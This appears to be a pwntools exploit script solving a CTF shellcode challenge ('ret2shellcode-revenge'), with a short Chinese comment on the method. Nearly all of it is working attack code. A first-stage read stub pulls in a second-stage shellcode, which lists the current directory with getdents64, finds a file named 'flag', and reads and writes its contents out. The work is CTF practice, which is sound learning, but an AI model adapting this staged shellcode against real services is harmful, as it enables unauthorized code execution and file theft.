"""0xGame week3_shellcode, but FOP
⽤getdents64系统调⽤获取当前⽬录下⽂件，然后遍历dirent64结构体即可。

"""
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
s = process("./ret2shellcode-revenge")
gdb.attach(s, 'b*$rebase(0x01555)\nc')
# s = gdb.debug('./ret2shellcode-revenge', 'b*$rebase(0x01547)\nc')
# s=remote("192.168.3.253",53001)
# sc=shellcraft.open("flag")+shellcraft.read(3,0x20230000,0x100)+shellcraft.write(1,0x20230000,0x100)
sc = """
xor rdi,rdi
xor dl,dl
push rdx
pop rsi
syscall # first read()
"""
sc2 = """
push rsi
pop rdi
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall # open
push rdi
pop rsi
add rsi,0x500
push rax
pop rdi
inc dh
push SYS_getdents64
pop rax
syscall # getdents64
push rsi
pop r12 # r12 = current linux_dirent64
jmp loop
loop_start:
xor r13,r13
mov r13w, word ptr [r12+0x10] # next linux_dirent64 offset
cmp dword ptr [r12+0x13], 0x67616c66 # "flag"
jz start_orw
add r12, r13 # r13 = next linux_dirent64
loop:
cmp qword ptr [r12+8],0
jz finish
jmp loop_start
start_orw:
push r12
pop rdi
add rdi,0x13
xor rsi,rsi
push rsi;pop rdx
push 2;pop rax
syscall # open flag
push rax
pop rdi
push r12
pop rsi
add rsi,0x100
inc dh
xor rax,rax
syscall # read flag content to buf
push 2;pop rdi
push rdi;pop rax
dec rax
syscall # write flag content to stderr
push 1
pop rax
push r12
pop rsi
add rsi,0x13
syscall # write flag name to stderr
finish:
push 0x3c
pop rax
syscall # exit
"""
s.sendafter(b"code:\n", asm(sc).rjust(0x100, b"\x90"))
s.send(b".\x00".ljust(0x100, b"\x90") + asm(sc2))
s.interactive()
